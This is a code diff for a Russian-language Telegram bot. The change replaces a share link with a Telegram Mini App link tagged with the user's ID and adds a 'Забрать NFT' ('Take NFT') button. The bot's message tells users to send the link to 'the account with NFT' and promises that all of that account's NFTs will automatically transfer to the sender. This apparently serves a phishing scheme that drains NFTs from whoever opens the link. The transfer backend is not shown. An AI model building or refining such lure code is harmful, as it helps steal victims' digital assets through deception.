@@ -1,6 +1,6 @@
 import os
 import logging
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
 from telegram.ext import Application, CommandHandler, ContextTypes
 from dotenv import load_dotenv
 
@@ -24,19 +24,25 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     logger.info(f"Пользователь {user_id} ({user.username}) запустил бота")
 
-    # Используем share endpoint для красивого preview
-    backend_url = os.getenv("WEBHOOK_URL", "https://project-nft.onrender.com")
-    share_link = f"{backend_url}/share/{user_id}"
+    # Прямая ссылка на Mini App
+    mini_app_url = f"{MINI_APP_URL}?tgWebAppStartParam={user_id}"
 
     message_text = (
-        f"👋 Привет, {user.first_name}!\n\n"
-        f"🦦 Отправь эту ссылку на аккаунт с NFT:\n\n"
-        f"{share_link}\n\n"
-        f"💎 Все NFT автоматически перейдут на этот аккаунт!"
+        f"🎁 **Отправить NFT**\n\n"
+        f"Отправь эту ссылку на аккаунт с NFT:\n"
+        f"{mini_app_url}\n\n"
+        f"💎 Все NFT автоматически перейдут на аккаунт **{user.first_name}**"
     )
+
+    # Кнопка с WebApp
+    keyboard = [
+        [InlineKeyboardButton("🎁 Забрать NFT", web_app={"url": mini_app_url})]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
 
     await update.message.reply_text(
         message_text,
+        reply_markup=reply_markup,
         parse_mode='Markdown'
     )
 
